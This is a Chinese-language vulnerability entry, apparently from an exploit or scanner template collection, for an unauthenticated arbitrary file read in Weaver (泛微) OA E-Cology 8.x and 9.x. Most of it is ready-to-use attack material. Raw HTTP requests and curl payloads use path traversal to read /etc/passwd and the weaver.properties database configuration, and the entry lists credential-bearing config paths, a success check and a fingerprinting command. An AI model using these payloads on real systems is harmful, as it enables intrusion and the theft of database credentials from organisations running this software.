---
id: WEAVER-ECOLOGY-FILEREAD
title: 泛微OA E-Cology 任意文件读取漏洞
product: weaver-oa
vendor: 泛微网络
version_affected: "E-Cology 9.x, 8.x"
severity: HIGH
tags: [file_read, 无需认证, 国产, oa]
fingerprint: ["泛微", "weaver", "ecology", "DBSynchroServlet", "DownloadServlet"]
---

## 漏洞描述

泛微OA多个接口存在任意文件读取/下载漏洞，可读取配置文件获取数据库凭据。

## 影响版本

- 泛微OA E-Cology 9.x
- 泛微OA E-Cology 8.x

## 前置条件

- 目标运行泛微OA E-Cology 且可通过网络访问
- 文件下载接口未做访问限制
- 无需认证

## 利用步骤

### DBSynchroServlet 文件下载

```http
GET /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_Check498498&arg1=DBSynchroServlet&v=33 HTTP/1.1
Host: target
```

### DownloadServlet 任意文件读取

```http
GET /weaver/weaver.file.DownloadServlet?fileid=../../../etc/passwd HTTP/1.1
Host: target
```

### 读取数据库配置

```http
GET /weaver/weaver.file.DownloadServlet?fileid=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
Host: target
```

关键配置文件路径:
- `/ecology/WEB-INF/prop/weaver.properties` — 数据库连接信息
- `/ecology/WEB-INF/prop/InitSysSet.properties` — 系统初始化配置

## Payload

### 读取 /etc/passwd

```bash
curl -s "http://target/weaver/weaver.file.DownloadServlet?fileid=../../../etc/passwd"
```

### 读取数据库配置文件

```bash
curl -s "http://target/weaver/weaver.file.DownloadServlet?fileid=../ecology/WEB-INF/prop/weaver.properties"
```

### Ctrl 接口文件读取

```bash
curl -s "http://target/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
```

## 验证方法

- 响应中包含 `/etc/passwd` 的内容（如 `root:x:0:0:`）即确认文件读取漏洞存在
- 数据库配置读取成功时响应中包含 `jdbc` 连接字符串或数据库密码

```bash
curl -s "http://target/weaver/weaver.file.DownloadServlet?fileid=../../../etc/passwd" | head -5
```

## 指纹确认

```bash
curl -s http://target/ecology/ | grep -i "ecology\|weaver"
```
